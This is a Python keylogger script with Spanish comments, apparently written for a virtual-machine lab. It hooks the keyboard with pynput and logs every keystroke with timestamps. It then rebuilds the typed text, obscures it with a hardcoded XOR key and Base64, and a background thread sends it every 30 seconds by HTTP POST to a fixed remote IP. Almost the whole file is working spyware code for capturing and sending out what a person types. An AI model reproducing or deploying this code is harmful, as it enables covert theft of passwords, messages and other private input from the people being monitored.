import time
import threading
from pynput import keyboard
import datetime
import os
import base64
import hashlib
import requests
import json
from reconstructor import TextReconstructor

class SimpleCrypto:
    """
    
    Usa XOR + Base64 para cifrar texto 
    
    """
    
    def __init__(self, password="ClaveSecreta2025-CyberSeguridad"):
        """
        Inicializa el cifrador con una clave.
        

        """
        # Generamos una clave numérica a partir del password
        self.key = self._generate_key(password)
    
    def _generate_key(self, password):
        """
        Convierte el password en una secuencia de números para el cifrado XOR.
        """
        # Usamos hash SHA-256 para generar una clave consistente
        hash_object = hashlib.sha256(password.encode())
        hex_dig = hash_object.hexdigest()
        
        # Convertimos cada par de caracteres hex en números
        key = []
        for i in range(0, len(hex_dig), 2):
            key.append(int(hex_dig[i:i+2], 16))
        
        return key
    
    def encrypt(self, text):
        """
        🔒 CIFRA el texto usando XOR + Base64.
        
        Proceso:
        1. Convierte texto a bytes
        2. Aplica XOR con la clave
        3. Codifica en Base64 para que sea texto legible
        """
        try:
            if not text:
                return ""
            
            # Convertir texto a bytes
            text_bytes = text.encode('utf-8')
            
            # Aplicar XOR con la clave (ciclando la clave si es necesario)
            encrypted_bytes = bytearray()
            for i, byte in enumerate(text_bytes):
                key_byte = self.key[i % len(self.key)]
                encrypted_bytes.append(byte ^ key_byte)
            
            # Codificar en Base64 para que sea texto
            encrypted_b64 = base64.b64encode(encrypted_bytes).decode('utf-8')
            
            return encrypted_b64
            
        except Exception as e:
            print(f"❌ Error cifrando: {e}")
            return ""

class UnifiedKeylogger:
    """

    1. Captura las teclas que presionas
    2. Las guarda en key_log.txt
    3. Cada X segundos reconstruye el texto automáticamente
    4. Guarda el texto legible en texto_concatenado.txt

    """
    
    def __init__(self, reconstruction_interval=5, enable_encryption=True, send_interval=30, target_ip="192.168.1.100", target_port=8080):
        # configuración básica de archivos
        self.script_dir = os.path.dirname(os.path.abspath(__file__))
        self.log_file = os.path.join(self.script_dir, "key_log.txt")
        self.output_file = os.path.join(self.script_dir, "texto_concatenado.txt")
        self.encrypted_file = os.path.join(self.script_dir, "texto_cifrado.enc")
        
        # configuración del reconstructor
        self.reconstructor = TextReconstructor()
        self.reconstruction_interval = reconstruction_interval
        
        # configuración de cifrado
        self.enable_encryption = enable_encryption
        if self.enable_encryption:
            self.crypto = SimpleCrypto("ClaveSecreta2025-CyberSeguridad")
        
        # configuración de envío remoto
        self.send_interval = send_interval  # cada cuántos segundos enviar
        self.target_ip = target_ip  # ip de tu máquina host
        self.target_port = target_port  # puerto donde escucha tu servidor
        self.target_url = f"http://{target_ip}:{target_port}/receive_data"
        
        # control de hilos
        self.running = False
        self.reconstruction_thread = None
        self.send_thread = None
        self.last_reconstruction_time = 0
        self.last_send_time = 0
        
        # estadísticas en tiempo real
        self.keys_captured = 0
        self.reconstructions_done = 0
        self.encryptions_done = 0
        self.sends_done = 0
        
        print(f"🎯 keylogger unificado iniciado")
        print(f"📁 archivos:")
        print(f"   - log: {self.log_file}")
        print(f"   - texto: {self.output_file}")
        if self.enable_encryption:
            print(f"   - cifrado: {self.encrypted_file}")
        print(f"⏱️  reconstrucción cada {reconstruction_interval} segundos")
        print(f"🔐 cifrado: {'activado' if self.enable_encryption else 'desactivado'}")
        print(f"📡 envío a {self.target_url} cada {send_interval} segundos")
        print(f"🚨 presiona ctrl+c para detener\n")
    
    def keyPressed(self, key):

        print(f"🔑 Tecla: {str(key)}")  # en pantalla qué tecla se presionó
        
        # timestamp actual
        time_stamp = datetime.datetime.now().strftime("%Y-%m-%d %H:%M:%S")
        
        # la tecla al archivo de log
        with open(self.log_file, "a", encoding="utf-8") as logkey:
            try:
                # ¿Es un carácter normal? (letra, número, símbolo)
                if hasattr(key, 'char') and key.char is not None:
                    logkey.write(f"{time_stamp}: {key.char}\n")
                else:
                    # Es una tecla especial (space, enter, ctrl, etc.)
                    logkey.write(f'[{key.name}]')
            except AttributeError:
                # Por si acaso hay alguna tecla rara que no podemos manejar
                logkey.write(f'[{str(key)}]')
        
        self.keys_captured += 1  # +1 tecla capturada
    
    def reconstruct_text_worker(self):
        """
        HILO DE RECONSTRUCCIÓN AUTOMÁTICA
        
        Este hilo corre en paralelo al keylogger su trabajo es revisar cada X segundos si necesita reconstruir el texto.
        """

        
        while self.running:
            try:
                current_time = time.time()
                
                # ¿Ya pasó el tiempo suficiente desde la última reconstrucción?
                if current_time - self.last_reconstruction_time >= self.reconstruction_interval:
                    
                    # ¿Hay un archivo de log para procesar?
                    if os.path.exists(self.log_file) and os.path.getsize(self.log_file) > 0:
                        print(f"\n🔄 Reconstruyendo texto automáticamente...")
                        
        
                        resultado = self.reconstructor.reconstruir_texto(
                            log_path=self.log_file,
                            output_path=self.output_file,
                            handle_backspace=True,
                            preserve_formatting=True
                        )
                        
                        # 🔐 CIFRADO AUTOMÁTICO después de reconstruir
                        if self.enable_encryption and resultado:
                            print(f"🔐 Cifrando texto automáticamente...")
                            encrypted_text = self.crypto.encrypt(resultado)
                            
                            # Guardar texto cifrado
                            with open(self.encrypted_file, "w", encoding="utf-8") as enc_file:
                                enc_file.write(encrypted_text)
                            
                            self.encryptions_done += 1
                            print(f"✅ Texto cifrado guardado")
                        
                        self.reconstructions_done += 1
                        self.last_reconstruction_time = current_time
                        
                        # preview del texto actual
                        preview = resultado[:100] + "..." if len(resultado) > 100 else resultado
                        print(f"📝 Texto actual: {repr(preview)}")
                        
                        stats_msg = f"📊 Estadísticas: {self.keys_captured} teclas | {self.reconstructions_done} reconstrucciones"
                        if self.enable_encryption:
                            stats_msg += f" | {self.encryptions_done} cifrados"
                        print(f"{stats_msg}\n")
                    
                # Espera antes de envío 
                time.sleep(1)
                
            except Exception as e:
                print(f"❌ Error en reconstrucción automática: {e}")
                time.sleep(5) 
    
    def send_encrypted_data(self):
        # envío el archivo cifrado a mi máquina host
        try:
            if not os.path.exists(self.encrypted_file):
                return False
            
            # leo el contenido cifrado
            with open(self.encrypted_file, 'r', encoding='utf-8') as f:
                encrypted_content = f.read().strip()
            
            if not encrypted_content:
                return False
            
            # preparo los datos para enviar
            payload = {
                'timestamp': datetime.datetime.now().isoformat(),
                'encrypted_data': encrypted_content,
                'source': 'vm_keylogger'
            }
            
            # intento enviar via HTTP POST
            response = requests.post(
                self.target_url,
                json=payload,
                timeout=5,
                headers={'Content-Type': 'application/json'}
            )
            
            if response.status_code == 200:
                self.sends_done += 1
                print(f"📡 envío #{self.sends_done} exitoso a {self.target_ip}")
                return True
            else:
                print(f"📡 error en envío: status {response.status_code}")
                return False
                
        except requests.exceptions.RequestException as e:
            print(f"📡 error de conexión: sin respuesta del host")
            return False
        except Exception as e:
            print(f"📡 error enviando datos: {e}")
            return False
    
    def send_worker(self):
        # hilo que se encarga de enviar datos periódicamente
        while self.running:
            try:
                current_time = time.time()
                
                # ¿es hora de enviar?
                if current_time - self.last_send_time >= self.send_interval:
                    if self.enable_encryption:
                        self.send_encrypted_data()
                    self.last_send_time = current_time
                
                # pausa antes de revisar de nuevo
                time.sleep(1)
                
            except Exception as e:
                print(f"📡 error en hilo de envío: {e}")
                time.sleep(5)  # pausa más larga si hay error
    
    def start(self):
        try:
            # limpio logs anteriores
            self.clear_previous_logs()
            
            self.running = True
            self.last_reconstruction_time = time.time()
            self.last_send_time = time.time()
            
            # hilo de reconstrucción automática
            self.reconstruction_thread = threading.Thread(
                target=self.reconstruct_text_worker,
                daemon=True  # daemon=True significa que si el programa principal termina, este hilo también
            )
            self.reconstruction_thread.start()
            
            # hilo de envío de datos cifrados
            if self.enable_encryption:
                self.send_thread = threading.Thread(
                    target=self.send_worker,
                    daemon=True
                )
                self.send_thread.start()
                print(f"📡 hilo de envío iniciado (cada {self.send_interval}s)")
            
            # listener del keylogger
            print("capturando teclas...")
            listener = keyboard.Listener(on_press=self.keyPressed)
            listener.start()

            listener.join()  
            
        except KeyboardInterrupt:
            print("\n🛑 Deteniendo keylogger...")
            self.stop()
        except Exception as e:
            print(f"💥 Error crítico: {e}")
            self.stop()
    
    def stop(self):
        # paro todos los hilos
        self.running = False
        
        # espero a que termine el hilo de reconstrucción
        if self.reconstruction_thread and self.reconstruction_thread.is_alive():
            self.reconstruction_thread.join(timeout=5)
        
        # espero a que termine el hilo de envío
        if self.send_thread and self.send_thread.is_alive():
            self.send_thread.join(timeout=5)
        
        # hago una última reconstrucción antes de cerrar
        if os.path.exists(self.log_file) and os.path.getsize(self.log_file) > 0:
            print("🔄 Reconstrucción final...")
            try:
                resultado = self.reconstructor.reconstruir_texto(
                    log_path=self.log_file,
                    output_path=self.output_file,
                    handle_backspace=True,
                    preserve_formatting=True
                )
                
                # 🔐 CIFRADO FINAL
                if self.enable_encryption and resultado:
                    print("🔐 Cifrado final...")
                    encrypted_text = self.crypto.encrypt(resultado)
                    with open(self.encrypted_file, "w", encoding="utf-8") as enc_file:
                        enc_file.write(encrypted_text)
                    self.encryptions_done += 1
                    print("✅ Cifrado final completado")
                
                print("✅ Reconstrucción final completada")
            except Exception as e:
                print(f"❌ Error en reconstrucción final: {e}")
        
        print(f"📊 RESUMEN FINAL:")
        print(f"   - Teclas capturadas: {self.keys_captured}")
        print(f"   - Reconstrucciones: {self.reconstructions_done}")
        if self.enable_encryption:
            print(f"   - Cifrados: {self.encryptions_done}")
        
        file_list = [self.log_file, self.output_file]
        if self.enable_encryption:
            file_list.append(self.encrypted_file)
        
        print(f"   - Archivos generados: {', '.join([os.path.basename(f) for f in file_list])}")
        print("👋 ¡Keylogger detenido!")
    
    def clear_previous_logs(self):

        try:
            if os.path.exists(self.log_file):
                os.remove(self.log_file)
                print("🧹 Log anterior eliminado")
            
            if os.path.exists(self.encrypted_file):
                os.remove(self.encrypted_file)
                print("🧹 Archivo cifrado anterior eliminado")
        except Exception as e:
            print(f"⚠️  No se pudieron limpiar archivos anteriores: {e}")

def main():
    """
    🎬 FUNCIÓN PRINCIPAL - AQUÍ EMPIEZA TODO
    """
    print("=" * 60)
    print("🚀 KEYLOGGER UNIFICADO EN TIEMPO REAL")
    print("=" * 60)
    print("✨ Características:")
    print("   - Captura teclas en tiempo real")
    print("   - Reconstruye texto automáticamente")
    print("   - Cifra el texto dinámicamente 🔐")
    print("   - Maneja backspaces correctamente")
    print("   - Muestra estadísticas en vivo")
    print("=" * 60)
    

    RECONSTRUCTION_INTERVAL = 3  # Tiempo para reconstruir
    ENABLE_ENCRYPTION = True     # 🔐 ¿Activar cifrado automático?
    

    keylogger = UnifiedKeylogger(
        reconstruction_interval=RECONSTRUCTION_INTERVAL,
        enable_encryption=ENABLE_ENCRYPTION
    )
    keylogger.start()

if __name__ == "__main__":
    main()
